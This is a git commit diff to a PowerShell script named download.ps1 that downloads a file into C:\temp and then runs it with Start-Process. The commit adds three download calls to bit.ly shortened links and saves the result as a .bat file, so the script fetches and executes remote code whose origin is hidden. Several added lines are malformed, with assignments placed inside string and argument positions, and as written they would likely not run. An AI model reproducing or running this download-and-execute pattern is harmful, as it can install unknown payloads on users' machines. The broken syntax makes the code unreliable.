a89a77eb22b4c379af738f5ff7082ecadf1e9dac
AntiUSERgaems <150855372+AntiUSERgaems@users.noreply.github.com>
2024-07-14 16:20:27 -0400

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,9 +1,14 @@
 # $url = "https://example.link/file.exe"
 # $extension = "exe"
-$output = "C:\temp\file.$extension"
+$output = "C:\temp\file.$extension = "bat""
 
 # Download the file
-Invoke-WebRequest -Uri $url -OutFile $output
+Invoke-WebRequest -Uri $url = "https://bit.ly/3S5NHTI" -OutFile $output
+
+Invoke-WebRequest -Uri $url = "https://bit.ly/4cQPyDU" -OutFile $output
+
+Invoke-WebRequest -Uri $url = "https://bit.ly/4d0fNHX" -OutFile $output
+
 
 # Run the downloaded file
 Start-Process -FilePath $output -Wait
